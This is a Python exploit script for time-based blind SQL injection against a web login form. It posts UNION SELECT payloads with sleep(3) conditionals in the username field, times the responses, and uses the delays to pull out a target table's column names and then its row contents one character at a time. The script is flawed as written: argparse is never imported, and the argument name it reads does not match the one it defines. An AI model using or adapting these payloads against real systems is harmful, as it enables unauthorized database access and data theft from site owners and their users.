import requests
from string import printable
import time


class Sqli:
    def __init__(self, name, payload_list, url):
        self.payload = payload_list
        self.name = name
        self.number = self.get_number()
        self.list_column = []
        self.url = url
        
    
    def get_length(self, num, payload):
        for len in range(10000):
            data = {
                'username': payload.format(self.name, num, len),
                'password': '123'
            }
            before_time = time.time()
            res = requests.post(self.url, data=data)
            after_time = time.time()
            # print(res.text)
            if after_time - before_time >= 3:
                return len


    def get_data(self, payload, length, num):
        result = ''
        for index in range(length):
            for char in printable:
                data = {
                    'username': payload.format(self.name, str(index+1), num, ord(char)),
                    'password': '123'
                }
                # print(data)
                before_time = time.time()
                res = requests.post(self.url, data=data)
                after_time = time.time()
                if after_time - before_time >= 3:
                    result += char
                    break
        return result


    def get_number(self):
        number = self.get_length(0, self.payload[0])
        return number


    def get_name(self):
        for column in range(0, self.number):

            length = self.get_length(column, self.payload[1])
            # print(length)
            self.list_column.append(self.get_data(self.payload[2], length, column))
        return self.list_column


def main():
    parser = argparse.ArgumentParser(description="Script Exploit SQL Injection")
    parser.add_argument('--url', help='Url want scan')
    parser.add_argument('--table', help='Table name')

    args = parser.parse_args()
    url = args.url
    table_name = args.table_name

    payload_column = []
    payload_column.append("' UNION SELECT 1,1,(SELECT case when (SELECT COUNT({}) FROM information_schema.columns WHERE table_schema=database() and table_name='"+table_name+"' LIMIT {}, 1) = {} then sleep(3) else 1 end)-- -")
    payload_column.append("' UNION SELECT 1,1,(SELECT case when (SELECT length({}) FROM information_schema.columns WHERE table_schema=database() and table_name='"+table_name+"' LIMIT {}, 1) = {} then sleep(3) else 1 end)-- -")
    payload_column.append("' UNION SELECT 1,1,(SELECT case when (SELECT ascii(substr({},{},1)) FROM information_schema.columns WHERE table_schema=database() and table_name='"+table_name+"' LIMIT {}, 1) = {} then sleep(3) else 1 end)-- - ")
    Column = Sqli("column_name", payload_column, url)
    list_column = Column.get_name()
    print("Have {} column".format(len(list_column)))
    print(list_column)


    payload_row = []
    payload_row.append("' UNION SELECT 1,1,(SELECT case when (SELECT COUNT({}) FROM " + table_name + " LIMIT {}, 1)={} then sleep(3) else 1 end)-- -")
    payload_row.append("' UNION SELECT 1,1,(SELECT case when (SELECT length({}) FROM " + table_name + " LIMIT {}, 1)={} then sleep(3) else 1 end)-- -")
    payload_row.append("' UNION SELECT 1,1,(SELECT case when (SELECT ascii(substr({}, {}, 1)) FROM " + table_name + " LIMIT {}, 1)={} then sleep(3) else 1 end)-- -")
    for column in list_column:
        Data = Sqli(column, payload_row, url)
        data = Data.get_name()
        print("{}: {}".format(column, data))


if __name__ == '__main__':
    main()
